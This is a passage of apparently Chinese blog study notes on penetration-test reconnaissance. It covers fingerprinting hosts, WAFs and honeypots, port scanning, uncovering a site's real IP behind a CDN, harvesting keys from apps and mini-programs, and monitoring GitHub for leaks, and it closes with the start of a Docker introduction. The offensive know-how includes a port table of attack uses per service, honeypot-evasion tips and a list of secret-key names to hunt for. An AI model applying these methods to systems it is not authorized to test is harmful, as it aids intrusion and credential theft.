alt="image-20240826213044634"></p><h2 id="主机架构-蜜罐识别-WAF识别-端口扫描-协议识别-服务安全"><a href="#主机架构-蜜罐识别-WAF识别-端口扫描-协议识别-服务安全" class="headerlink" title="主机架构&amp;蜜罐识别&amp;WAF识别&amp;端口扫描&amp;协议识别&amp;服务安全"></a>主机架构&amp;蜜罐识别&amp;WAF识别&amp;端口扫描&amp;协议识别&amp;服务安全</h2><p>补充：</p><p>CMS                                                                                                                                                                                                          Discuz、WordPress、Ecshop、蝉知等</p><p>前端技术<br>HTML5、jquery、bootstrap、Vue等</p><p>开发语言<br>PHP、JAVA、Ruby、Python、C#，JS等</p><p>Web服务器<br>Apache、Nginx、IIS、lighttpa等</p><p>应用服务器<br>Tomcat、Jboss、Weblbqic、Websphere等</p><p>操作系统信息<br>Linux、windows等</p><p>应用服务信息:<br>ETP、SSH、RDP、SM、SMTP、LDAP、Rsync等</p><p>CDN信息<br>帝联、cloudflare、网宿、七牛云、阿里云等</p><p>WAF信息<br>创宇盾、宝塔、ModSecurity、玄武盾、OpenRASP等。</p><p>蜜罐信息:<br>HFish、TeaPot、T-Pot、Glastopf等</p><p>Web服务器和应用服务器的区别：web服务器主要是针对前端处理静态的页面内容，应用服务器主要是针对处理动态页面内容 </p><p>web服务器的类型可以直接在浏览器的插件中看到或者响应包中的Server字段中可以看到 </p><p>但是应用服务器就是需要去查看这个网站所开放的端口来判断是什么类型的服务器</p><p>端口扫描：{nmap，Masscan}主动扫描；{网络空间} 被动扫描；</p><p>分清主动扫描和被动扫描  </p><p>nmap推荐可视化操作比较简单直观</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409021024795.png" alt="image-20240902102417660"></p><p>在fofa中的ip聚合中可以看到   [缺点可能有的站点搜不到]</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409020919195.png" alt="image-20240902091946094"></p><h3 id="端口的相关信息"><a href="#端口的相关信息" class="headerlink" title="端口的相关信息"></a>端口的相关信息</h3><table><thead><tr><th>端口</th><th>服务</th><th>渗透用途</th></tr></thead><tbody><tr><td>tcp 20,21</td><td>FTP</td><td>允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td></tr><tr><td>tcp 22</td><td>SSH</td><td>可根据已搜集到的信息尝试爆破,v1版本可中间人,ssh隧道及 内网代理转发,文件传输等等</td></tr><tr><td>tcp 23</td><td>Telnet</td><td>爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令</td></tr><tr><td>tcp 25</td><td>SMTP</td><td>邮件伪造,vrfy&#x2F;expn查询邮件用户信息,可使用smtp-user- enum工具来自动跑</td></tr><tr><td>tcp&#x2F;udp 53</td><td>DNS</td><td>允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道 的远控</td></tr><tr><td>tcp&#x2F;udp 69</td><td>TFTP</td><td>尝试下载目标及其的各类重要配置文件</td></tr><tr><td>tcp 80- 89,443,8440 -8450,8080- 8089</td><td>各种常用的 Web服务端 口</td><td>可尝试经典的topn,vpn,owa,webmail,目标oa,各类Java 控制 台,各类服务器Web管理面板,各类Web中间件漏洞利用,各 类Web框架漏洞利用等等·····</td></tr><tr><td>tcp 110</td><td>POP3</td><td>可尝试爆破,嗅探</td></tr><tr><td>tcp 111,2049</td><td>NFS</td><td>权限配置不当</td></tr><tr><td>tcp 137,139,445</td><td>Samba</td><td>可尝试爆破以及smb自身的各种远程执行类漏洞利用, 如,ms08-067,ms17-010,嗅探等····</td></tr><tr><td>tcp 143</td><td>IMAP</td><td>可尝试爆破</td></tr><tr><td>udp 161</td><td>SNMP</td><td>爆破默认团队字符串,搜集目标内网信息</td></tr><tr><td>tcp 389</td><td>LDAP</td><td>Idap注入,允许匿名访问,弱口令</td></tr><tr><td>tcp 512,513,514</td><td>Linux rexec</td><td>可爆破,rlogin登陆</td></tr><tr><td>tcp 873</td><td>Rsync</td><td>匿名访问,文件上传</td></tr><tr><td>tcp 1194</td><td>OpenVPN</td><td>想办法钓VPN账号,进内网</td></tr><tr><td>tcp 1352</td><td>Lotus</td><td>弱口令,信息泄漏,爆破</td></tr><tr><td>tcp 1433</td><td>SQL Server</td><td>注入,提权,sa弱口令,爆破</td></tr><tr><td>tcp 1521</td><td>Orade</td><td>tns爆破,注入,弹 shell··</td></tr><tr><td>tcp 1500</td><td>ISPmanager</td><td>弱口令</td></tr><tr><td>tcp 1723</td><td>PPTP</td><td>爆破,想办法钓 VPN账号,进内网</td></tr><tr><td>tcp 2082,2083</td><td>cPanel</td><td>弱口令</td></tr><tr><td>tcp 2181</td><td>ZooKeeper</td><td>未授权访问</td></tr><tr><td>tcp 2601,2604</td><td>Zebra</td><td>默认密码zerbra</td></tr><tr><td>tcp 3128</td><td>Squid</td><td>弱口令</td></tr><tr><td>tcp 3312,3311</td><td>kangle</td><td>弱口令</td></tr><tr><td>tcp 3306</td><td>MySQL</td><td>注入,提权,爆破</td></tr><tr><td>tcp 3389</td><td>Windows rdp</td><td>shift后门[需要03以下的系统],爆破,ms12-020</td></tr><tr><td>tcp 3690</td><td>SVN</td><td>svn泄露,未授权访问</td></tr><tr><td>tcp 4848</td><td>GlassFish</td><td>弱口令</td></tr><tr><td>tcp 5000</td><td>Sybase&#x2F;DB2</td><td>爆破,注入</td></tr><tr><td>tcp 5432</td><td>PostgreSQL</td><td>爆破,注入,弱口令</td></tr><tr><td>tcp 5900,5901,5 902</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>tcp 5984</td><td>CouchDB</td><td>未授权导致的任意指令执行</td></tr><tr><td>tcp 6379</td><td>Redis</td><td>可尝试未授权访问,弱口令爆破</td></tr><tr><td>tcp 7001,7002</td><td>WebLogic</td><td>Java反序列化,弱口令</td></tr><tr><td>tcp 7778</td><td>Kloxo</td><td>主机面板登录</td></tr><tr><td>tcp 8000</td><td>Ajenti</td><td>弱口令</td></tr><tr><td>tcp 8009</td><td>tomcat Ajp</td><td>Tomcat-Ajp协议漏洞</td></tr><tr><td>tcp 8443</td><td>Plesk</td><td>弱口令</td></tr><tr><td>tcp 8069</td><td>Zabbix</td><td>远程执行,SQL注入</td></tr><tr><td>tcp 8080- 8089</td><td>Jenkins,JBoss</td><td>反序列化,控制台弱口令</td></tr><tr><td>tcp 9080- 9081,9090</td><td>WebSphere</td><td>Java反序列化&#x2F;弱口令</td></tr><tr><td>tcp 9200,9300</td><td>ElasticSearch</td><td>远程执行</td></tr><tr><td>tcp 11211</td><td>Memcached</td><td>未授权访问</td></tr><tr><td>tcp 27017,27018</td><td>MongoDB</td><td>爆破,未授权访问</td></tr><tr><td>tcp 50070,50030</td><td>Hadoop</td><td>默认端口未授权访问</td></tr></tbody></table><h3 id="端口扫描的相关注意的点"><a href="#端口扫描的相关注意的点" class="headerlink" title="端口扫描的相关注意的点"></a>端口扫描的相关注意的点</h3><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409021029865.png" alt="image-20240902102903760"></p><p>如果在协议中没有http协议就不要尝试在浏览器中访问了 一般访问不到</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409021030249.png" alt="image-20240902103047153"></p><p>这个也是一样的如果，没有http服务就在浏览器上访问不到</p><p>在状态中如果是filtered的话就可能是有可能开也有可能不开 可能是waf的原因也有可能这个端口仅仅只在内网中存活</p><h3 id="端口扫描扫的是什么"><a href="#端口扫描扫的是什么" class="headerlink" title="端口扫描扫的是什么"></a>端口扫描扫的是什么</h3><p>可以根据所开放的端口来判断下列东西：</p><p>应用中间件<br>数据库类型<br>其他服务协议</p><h3 id="WAF的识别"><a href="#WAF的识别" class="headerlink" title="WAF的识别"></a>WAF的识别</h3><p>由于不同的waf的防护规则不同可以试试不同的方法拿到shell</p><h4 id="方法：-1"><a href="#方法：-1" class="headerlink" title="方法："></a><strong>方法：</strong></h4><p>（1）直接在网站上尝试注入等操作看拦截页面</p><p>（2）项目识别：</p><p>wafw00f </p><p>identYwaf</p><p>（3）在网络空间上找</p><h3 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h3><h4 id="什么是蜜罐"><a href="#什么是蜜罐" class="headerlink" title="什么是蜜罐"></a>什么是蜜罐</h4><p>蜜罐是一种安全威胁的检测技术，其本质在于引诱和欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队攻击者的角度钻研蜜罐识别的方式方法</p><h4 id="蜜罐的分类"><a href="#蜜罐的分类" class="headerlink" title="蜜罐的分类"></a>蜜罐的分类</h4><p>根据蜜罐与攻击者之间进行的交互的程度可以将蜜罐分为三类:低交互蜜罐、中交互蜜罐、高交互蜜罐。当然还可以根据蜜罐模拟的目标进行分类，比如: 数据库蜜罐、工控蜜罐、物联网蜜罐、Web蜜罐等等</p><h4 id="蜜罐产品"><a href="#蜜罐产品" class="headerlink" title="蜜罐产品"></a>蜜罐产品</h4><table><thead><tr><th>蜜罐</th><th>Quake 系统搜索语法</th></tr></thead><tbody><tr><td>STRUTSHONEYPOT</td><td>app:”StrutsHoneypot”</td></tr><tr><td>CONPOT HTTP蜜罐</td><td>app:”Conpot Http 蜜罐”</td></tr><tr><td>CONPOT MODBUS 蜜罐</td><td>app:”Conpot modbus 蜜罐”</td></tr><tr><td>CONPOT S7蜜罐</td><td>app:”Conpot s7 蜜罐”</td></tr><tr><td>KIPPO 蜜罐</td><td>app:”kippo 蜜罐”</td></tr><tr><td>HONEYPY HTTP蜜罐</td><td>app:”Honeypy Http蜜罐”</td></tr><tr><td>HONEYPY ES蜜罐</td><td>app:”Honeypy ES蜜罐”</td></tr><tr><td>AMUN IMAP蜜罐</td><td>app:”amun imap 蜜罐”</td></tr><tr><td>AMUN HTTP 蜜罐</td><td>app:”amun http 蜜罐”</td></tr><tr><td>NEPENTHES NETBIOS 蜜罐</td><td>app:”Nepenthes netbios 蜜罐”</td></tr><tr><td>NEPENTHES FTP 蜜罐</td><td>app:”Nepenthes FTP 蜜罐”</td></tr><tr><td>SSHESAME SSH 蜜罐</td><td>app:”sshesame ssh 蜜罐”</td></tr><tr><td>OPENCANARY蜜罐管理后台</td><td>app:”opencanary 蜜罐管理后台”</td></tr><tr><td>DIONAEA SIPD 蜜罐</td><td>app:”Dionaea sipd 蜜罐”</td></tr><tr><td>DIONAEA SMBD 蜜罐</td><td>app:”Dionaea smbd 蜜罐”</td></tr><tr><td>DIONAEA HTTP蜜罐</td><td>app:”Dionaea Http 蜜罐”</td></tr><tr><td>DIONAEA MSSQL蜜罐</td><td>app:”Dionaea MSSQL 蜜罐”</td></tr><tr><td>DIONAEA FTP蜜罐</td><td>app:”Dionaea ftp 蜜罐”</td></tr><tr><td>DIONAEA MEMCACHED 蜜罐</td><td>app:”Dionaea Memcached 蜜罐”</td></tr><tr><td>KOJONEY SSH 蜜罐</td><td>app:”Kojoney SSH 蜜罐”</td></tr><tr><td>WEBLOGIC 蜜罐</td><td>app:”weblogic 蜜罐”</td></tr><tr><td>MYSQL 蜜罐</td><td>app:”MySQL蜜罐”</td></tr><tr><td>HFISH 蜜罐</td><td>app:”HFish 蜜罐”</td></tr><tr><td>HFISH蜜罐管理后台</td><td>app:”HFish 蜜罐管理后台”</td></tr><tr><td>HONEYTHING物联网蜜罐</td><td>app:”honeything 物联网蜜罐”</td></tr><tr><td>ELASTICSEARCH蜜罐</td><td>app:”elasticsearch 蜜罐”</td></tr><tr><td>HOSTUS 蜜罐</td><td>app:”HostUS蜜罐”</td></tr><tr><td>WHOISSCANME 蜜罐</td><td>app:”whoisscanme 蜜罐”</td></tr><tr><td>未知蜜罐</td><td>app:“未知蜜罐”</td></tr><tr><td>COWRIE TELNETD 蜜罐</td><td>app:”Cowrie telnetd 蜜罐”</td></tr><tr><td>GLASTOPF蜜罐</td><td>app:”glastopf 蜜罐”</td></tr></tbody></table><h4 id="蜜罐的简单搭建"><a href="#蜜罐的简单搭建" class="headerlink" title="蜜罐的简单搭建"></a>蜜罐的简单搭建</h4><p>HFish的搭建：<a href="https://hfish.net/#/2-2-linux">https://hfish.net/#/2-2-linux</a>   可以一键部署</p><p>通过搭建蜜罐来了解他的工作模式从而来了解如何识别</p><h4 id="蜜罐的识别"><a href="#蜜罐的识别" class="headerlink" title="蜜罐的识别"></a>蜜罐的识别</h4><p><strong>1.人工识别</strong></p><p>可以根据一些特征端口比如：HFish默认开放4433端口</p><p>（1）端口多而有规律性   [因为有的蜜罐的内置节点有点多开放了很多连续的端口]</p><p>（2）web访问协议就下载   [意思是如果在web网页上访问一个网站的时候有可能网页所返回的并不是一个正常的HTML页面而是触发了一个下载文件]</p><p>（3）设备指纹对应分析</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409022124873.png" alt="image-20240902212429755"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409022112383.webp" alt="640"></p><p><strong>2.项目识别</strong></p><p>浏览器插件：<a href="https://github.com/graynjo/Heimdallr">https://github.com/graynjo/Heimdallr</a> 注意误报率有点高</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409021918160.png" alt="image-20240902191854942"></p><p>如果指纹嗅探和蜜罐告警存在的话 就已经基本确定是蜜罐了</p><p><a href="https://github.com/360quake/quake_rs/releases/tag/v3.1.9">https://github.com/360quake/quake_rs/releases/tag/v3.1.9</a></p><p>有误报 稍微好一点</p><p><strong>3.网络空间也可识别</strong></p><h4 id="CDN的一些补充"><a href="#CDN的一些补充" class="headerlink" title="CDN的一些补充"></a>CDN的一些补充</h4><p>​1.可以通过主动漏洞来得到目标网站的真实ip   [比如一些网站可以上传一些本地的图片或者一些链接而这个目标网站就会主动去加载访问这个上传的图片或者链接  这样的话我们所控制的服务器的终端就可以显示到底是谁访问的这样的话就可以知道目标网站的真实ip]   因为是目标网站主动访问所以我们在所控制的服务器的终端所得到的ip是真实的</p><p>   2.通过目标网站主动向我们发送邮件  比如：<strong>因为邮件的传输过程一般不涉及CDN</strong></p><p>（1）rss订阅   [订阅之后目标网站会不定时向你发送订阅消息]<br>（2）邮箱注册、激活处<br>（3）邮箱找回密码处<br>（4）产品更新的邮件推送<br>（5）某业务执行后发送的邮件通知<br>（6）员工邮箱、邮件管理平合等入口处的忘记密码</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409031604593.png" alt="屏幕截图 2024-09-03 160122"></p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409031604968.png" alt="屏幕截图 2024-09-03 160113"></p><p>需要注意的点是<strong>发件人的邮箱要跟网站的域名相同</strong>    因为一个网站可能依托于其他邮箱平台来发送邮件</p><p>​3.我们可以去主动发送邮件给一个用户名不存在的邮箱地址   <strong>大前提：[我用来发送邮件所使用的系统必须得是自己搭建的</strong> 才能够看到发送失败的消息中的真实ip]</p><p>因为如果邮箱发送失败会返回一个发送失败的消息而这个发送失败的消息中会包含目标网站的真实ip</p><p>例子：                                                                                                                                                                                                           一个邮箱地址通常由三部分组成分别是：用户名[4657576858]   分隔符[@]   域名[qq.com]                                                                                       假如说我要去查看qq.com的真实ip我只需要去给一个完全不存在的用户名[<a href="mailto:&#49;&#x32;&#51;&#x34;&#53;&#54;&#x37;&#x38;&#57;&#49;&#x40;&#113;&#x71;&#46;&#99;&#111;&#x6d;">&#49;&#x32;&#51;&#x34;&#53;&#54;&#x37;&#x38;&#57;&#49;&#x40;&#113;&#x71;&#46;&#99;&#111;&#x6d;</a>]发邮件即可在发送失败的信息中得到qq.com的真实ip</p><p>​4.通过项目来确定</p><p>fuckcdn </p><h3 id="如何识别各类框架："><a href="#如何识别各类框架：" class="headerlink" title="如何识别各类框架："></a>如何识别各类框架：</h3><p>参考：<a href="https://blog.csdn.net/weixin_50750081/article/details/135934536">https://blog.csdn.net/weixin_50750081/article/details/135934536</a></p><p>以上需要人为查看以下部分来确定</p><p>（1）response数据包特征（有的请求包或者返回包会有get-cookie有一部分是固定的 会包含有框架名）</p><p>（2）页面ico图标</p><p>（3）特有的url路径后缀</p><p>（4）固定开放的端口</p><h2 id="APP资产"><a href="#APP资产" class="headerlink" title="APP资产"></a>APP资产</h2><h3 id="名称获取APP信息"><a href="#名称获取APP信息" class="headerlink" title="名称获取APP信息"></a>名称获取APP信息</h3><p>七麦&#x2F;点点</p><h3 id="通过url查备案来查开发者名称"><a href="#通过url查备案来查开发者名称" class="headerlink" title="通过url查备案来查开发者名称"></a>通过url查备案来查开发者名称</h3><h3 id="APP中收集资产"><a href="#APP中收集资产" class="headerlink" title="APP中收集资产"></a>APP中收集资产</h3><p>通过获取App配置、数据包，去获取 apiosskey、js等敏感信息<br>1、抓包<br>2、提取<br>3、搜索</p><h3 id="APP提取信息-静态搜集"><a href="#APP提取信息-静态搜集" class="headerlink" title="APP提取信息-静态搜集"></a>APP提取信息-静态搜集</h3><p>1、使用线上评估工具部分也可反编译<a href="https://zhihuaspace.cn:8888/recent_scans/10/10/">https://zhihuaspace.cn:8888/recent_scans/10/10/</a></p><p>2、反编译出源码来静态分析</p><h3 id="APP提取信息-动态搜集"><a href="#APP提取信息-动态搜集" class="headerlink" title="APP提取信息-动态搜集"></a>APP提取信息-动态搜集</h3><p>[注意：app抓包一定要配置好代理ip不然有可能导致网站打不开]</p><p>burp、fidder、charles抓包分析  可以抓包改包实现交互</p><p>可以收集信息的工具项目appinfoscaner</p><h1 id="MOBSF环境搭建-可以动态抓包和动态调试-强烈推荐"><a href="#MOBSF环境搭建-可以动态抓包和动态调试-强烈推荐" class="headerlink" title="MOBSF环境搭建 可以动态抓包和动态调试[强烈推荐]"></a>MOBSF环境搭建 可以动态抓包和动态调试[强烈推荐]</h1><p>优点：无误报，而且可以解决一些app因为反代理而无法抓包的问题</p><p>缺点：所收集的信息可能并不完整</p><h3 id="收集点："><a href="#收集点：" class="headerlink" title="收集点："></a>收集点：</h3><p>1、资产信息-IP 域名网站-转到对应Web测试 接口试服务测试</p><p>2、泄露信息-配置key 资源文件- key (osskey利用，邮件配置等) [oss是云存储服务]</p><p>3、代码信息-iava代码安全问题- 逆向相关</p><h3 id="框架："><a href="#框架：" class="headerlink" title="框架："></a>框架：</h3><p>​<img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409101951597.png" alt="屏幕截图 2024-09-10 194914"></p><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><h2 id="小程序、pc应用、APP、浏览器的web网站抓包"><a href="#小程序、pc应用、APP、浏览器的web网站抓包" class="headerlink" title="小程序、pc应用、APP、浏览器的web网站抓包"></a>小程序、pc应用、APP、浏览器的web网站抓包</h2><p>只针对http和https  <strong>burp只能抓到http和https协议的数据包</strong></p><p>设置chales将所抓到的包转发到burp中[因为burp抓包是需要配置代理而直接使用chares来进行流量转发比较容易操作]</p><p>可以使用profixer配置代理规则来抓指定的pc应用和小程序包</p><p>fidder也可将所抓取到的数据包转发到burp中 如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409120932133.png" alt="image-20240912093204984"></p><p><strong>[注：以上三款工具仅仅只能用来抓http和https协议的数据包]</strong></p><h2 id="抓除了http以及https协议以外的包"><a href="#抓除了http以及https协议以外的包" class="headerlink" title="抓除了http以及https协议以外的包"></a>抓除了http以及https协议以外的包</h2><p>工具：</p><p>科来[使用门槛较低]  </p><p>wireshark</p><h2 id="封包抓取http数据包"><a href="#封包抓取http数据包" class="headerlink" title="封包抓取http数据包"></a>封包抓取http数据包</h2><p>封包[指的是通过网络传输的数据包]</p><p>可以抓关于APP的所有的数据包</p><p>用封包来抓取app的数据包的原因 （虽然科来网络分析系统和wireshark可以抓住数据包但是一些数据包是不可以发送的而且一旦发送错误的数据包可能会导致app直接死掉） （小程序和pc应用不可以）</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409121222422.png" alt="image-20240912122202306"></p><p>如图：我们可以得到目标的ip地址以及端口</p><p>burp只能抓http或者https协议的数据包</p><p>如果要抓pc应用或者app的非http和https的数据包建议现阶段 先使用科来，wireshark的操作较为繁琐</p><p>微信小程序启动所对应的exe为wechatappex.exe 如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409121639021.png" alt="image-20240912163859952"></p><p>因为每次打开小程序后都会在<code>C:\Users\35358\Documents\WeChat Files\Applet</code>这个文件夹下生成一个包 我们可以利用小程序助手来反编译最后我们再将反编译的文件夹结合微信开发者工具便可以在开发者工具中预览这个小程序<strong>当我们点击不同的文件的时候小程序会有不同的反应 有可能挖到未授权访问以及敏感信息泄露</strong></p><h2 id="小程序的文件结构"><a href="#小程序的文件结构" class="headerlink" title="小程序的文件结构"></a>小程序的文件结构</h2><p>1.主体结构</p><p>小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。</p><p>一个小程序主体部分(即 app)由三个文件组成，必须放在项目的根目录，如下：</p><p> 文件 必需 作用 </p><p> app.js 是 小程序逻辑</p><p> app.json 是 小程序公共配置</p><p> app.wxss 否 小程序公共样式表</p><p>2.一个小程序页面由四个文件组成，分别是: </p><p> xxx.js 页面逻辑</p><p> xxx.json 页面配置</p><p> xxx.wxml 页面结构</p><p> xxx.wxss 页面样式</p><p>3.项目整体目录结构</p><p> pages 页面文件夹                                                                                                                                                </p><p>index 首页</p><p> logs 日志</p><p> utils </p><p> util 工具类(mina 框架自动生成,你也可以建立一个：api)</p><p> app.js 入口 js(类似于 java 类中的 main 方法)、全局 js</p><p> app.json 全局配置文件</p><p> app.wxss 全局样式文件</p><p> project.config.json 跟你在详情中勾选的配置一样</p><p> sitemap.json 用来配置小程序及其页面是否允许被微信索引</p><h3 id="如何获取小程序"><a href="#如何获取小程序" class="headerlink" title="如何获取小程序"></a>如何获取小程序</h3><p>百度 微信 抖音头条 支付宝</p><h3 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h3><p>对源码架构进行分析<br>-更多的资产信息（客户信息泄露）<br>-敏感的配置信息（各种key）<br>-未授权访问测试<br>-源码中的安全问题 </p><h2 id="常见敏感key名称"><a href="#常见敏感key名称" class="headerlink" title="常见敏感key名称"></a>常见敏感key名称</h2><ol><li><p><strong>AccessKey</strong> &#x2F; <strong>AccessKeyId</strong>  </p><ul><li>说明：通常用于身份验证和授权操作。常见于云服务（如AWS、Aliyun）中，AccessKeyId用于标识用户或服务。</li></ul></li><li><p><strong>SecretKey</strong> &#x2F; <strong>SecretAccessKey</strong>  </p><ul><li>说明：配合AccessKeyId使用，是一种密钥，用于确认请求是合法的。应与AccessKeyId保密配对使用。</li></ul></li><li><p><strong>APIKey</strong>  </p><ul><li>说明：用于访问API的密钥，通常被嵌入到客户端请求中以进行身份验证和权限控制。</li></ul></li><li><p><strong>PrivateKey</strong>  </p><ul><li>说明：非对称加密中的私钥，用于解密由公钥加密的数据或签名数字证书，通常严格保密。</li></ul></li><li><p><strong>PublicKey</strong>  </p><ul><li>说明：非对称加密中的公钥，通常用于加密数据或验证数字签名，公开给其他用户或系统。</li></ul></li><li><p><strong>ClientId</strong>  </p><ul><li>说明：在OAuth2等身份验证协议中用于标识应用程序或客户端。通常与ClientSecret配合使用。</li></ul></li><li><p><strong>ClientSecret</strong>  </p><ul><li>说明：与ClientId配合使用的密钥，用于确认客户端应用的身份，防止未经授权的访问。</li></ul></li><li><p><strong>Token</strong> &#x2F; <strong>AccessToken</strong>  </p><ul><li>说明：用于API请求中的身份验证，常用于OAuth2等协议中，表示短期有效的授权。</li></ul></li><li><p><strong>SessionToken</strong>  </p><ul><li>说明：用于在一个会话期间保持用户状态的临时密钥，常用于Web应用中。</li></ul></li><li><p><strong>AuthToken</strong>  </p><ul><li>说明：用于授权的令牌，允许用户或应用程序访问受限的资源或服务。</li></ul></li><li><p><strong>OAuthToken</strong>  </p><ul><li>说明：OAuth协议中的授权令牌，用于允许第三方应用访问用户资源而不需要暴露用户的凭证。</li></ul></li><li><p><strong>Password</strong>  </p><ul><li>说明：用户或系统的登录密码，通常用于用户身份验证的第一层防护。</li></ul></li><li><p><strong>RefreshToken</strong>  </p><ul><li>说明：OAuth协议中的令牌，用于获取新的AccessToken，在AccessToken过期后继续访问资源。</li></ul></li><li><p><strong>EncryptionKey</strong>  </p><ul><li>说明：用于加密数据的密钥，可以是对称或非对称加密算法的一部分。</li></ul></li><li><p><strong>SigningKey</strong>  </p><ul><li>说明：用于数字签名的密钥，确保消息或文件的完整性和真实性。</li></ul></li><li><p><strong>MasterKey</strong>  </p><ul><li>说明：用于管理其他加密密钥的主密钥，具有极高的敏感性，通常用于加密数据或生成其他密钥。</li></ul></li><li><p><strong>SecurityKey</strong>  </p><ul><li>说明：用于身份验证和加密的安全密钥，常用于硬件设备（如U2F设备）或双重验证中。</li></ul></li><li><p><strong>SSHKey</strong>  </p><ul><li>说明：SSH（Secure Shell）协议中用于安全登录远程服务器的密钥，通常分为公钥和私钥两部分</li></ul></li></ol><h2 id="红蓝队项目合集"><a href="#红蓝队项目合集" class="headerlink" title="红蓝队项目合集"></a>红蓝队项目合集</h2><p><a href="https://github.com/guchangan1/All-Defense-Tool">https://github.com/guchangan1/All-Defense-Tool</a></p><h3 id="信息打点工具"><a href="#信息打点工具" class="headerlink" title="信息打点工具"></a>信息打点工具</h3><p>灯塔[不能收集edu还有gov]</p><p>Nemo[都可以收集 比较好也可进行内网的信息搜集前提要攻击队员本地搭建好可运行worker的环境，启动自定义模式的worker：]</p><h2 id="github信息搜集"><a href="#github信息搜集" class="headerlink" title="github信息搜集"></a>github信息搜集</h2><h3 id="直接域名加上关键字"><a href="#直接域名加上关键字" class="headerlink" title="直接域名加上关键字"></a>直接域名加上关键字</h3><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409181955653.png" alt="image-20240918195529526"></p><p><strong>有两个作用：</strong></p><p>1.获取更多的资产信息</p><p>2.主要是要瞅瞅有没有敏感文件泄露</p><p>（可以顺便瞅瞅项目的发布时间来辅助判定信息是否可以使用）</p><p>也可以直接搜邮箱 eg：@qq.com   或者   直接搜负责人的电话 以及相关都可以</p><h3 id="利用项目语法固定长期后续监控新泄露"><a href="#利用项目语法固定长期后续监控新泄露" class="headerlink" title="利用项目语法固定长期后续监控新泄露"></a>利用项目语法固定长期后续监控新泄露</h3><p>-基于关键字监控</p><p>-基于项目规则监控</p><p>1.<a href="https://github.com/madneal/gshark">https://github.com/madneal/gshark</a>                                                                                                                                                                 2.<a href="https://github.com/NHPT/FireEyeGoldCrystal">https://github.com/NHPT/FireEyeGoldCrystal</a>                                                                                                                                                              3. <a href="https://github.com/Explorer1092/Github-Monitor">https://github.com/Explorer1092/Github-Monitor</a></p><p><strong>目的：</strong>取得目标中开发人员或者托管公司上传的项目存在源码泄漏或配置信息(密码密匙等)<br>人员数据库等敏感信息，找到多个脆弱点。</p><h2 id="通过证书、图标查资产"><a href="#通过证书、图标查资产" class="headerlink" title="通过证书、图标查资产"></a>通过证书、图标查资产</h2><h3 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h3><p>搜索网站：fofa quake hunter</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409231425433.png" alt="屏幕截图 2024-09-23 142414"></p><p>然后再网络空间搜集即可 cert&#x3D;”github.com”</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409231428156.png" alt="image-20240923142822092"></p><h3 id="图标"><a href="#图标" class="headerlink" title="图标"></a>图标</h3><p>搜索网站：fofa quake hunter</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202409231451764.png" alt="image-20240923145143663"></p><p>将一个页面的ico图标保存下来然后直接在鹰图上在图标检测中上传即可</p>]]></content>
    
    
    
    <tags>
      
      <tag>信息打点</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker学习</title>
    <link href="/2024/08/04/Docker%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/08/04/Docker%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>Docker学习</p><h1 id="一、初识Docker"><a href="#一、初识Docker" class="headerlink" title="一、初识Docker"></a>一、初识Docker</h1><h2 id="1-Docker是什么以及为什么要有docker"><a href="#1-Docker是什么以及为什么要有docker" class="headerlink" title="1.Docker是什么以及为什么要有docker"></a>1.Docker是什么以及为什么要有docker</h2><p>对于软件开发以及我们在使用一些脚本的时候常常会遇到一些问题 那就是环境变量的配置</p><p>如果想要去使用一个软件，用户必须保证两件事：操作系统的设置，各种库和组件的安装。只有它们都正确，软件才能运行。举个例子：安装一个 Python 应用，如果想要其实现他的功能 计算机必须有 Python 引擎，还必须有各种依赖项还要手动去配置环境变量</p><p><strong>Docker</strong>就相当于一个容器可以把这个应用以及他要运行所需要的所有的依赖项以及他所需要的环境都给一起打包起来 如果别人要这个软件你只需要把这个docker给他；他开箱就可直接使用</p><p>docker相对于虚拟机来说的话占用资源少 启动快</p><h2 id="2-Docker的主要用途"><a href="#2-Docker的主要用途" class="headerlink" title="2.Docker的主要用途"></a>2.Docker的主要用途</h2><p>Docker 的主要用途，目前有三大类。</p><p><strong>（1）提供一次性的环境。</strong>比如，本地测试他人的软件、持续集成的时候提供单元测试和构建的环境。</p><p><strong>（2）提供弹性的<strong><strong>云服务</strong></strong>。</strong>因为 Docker 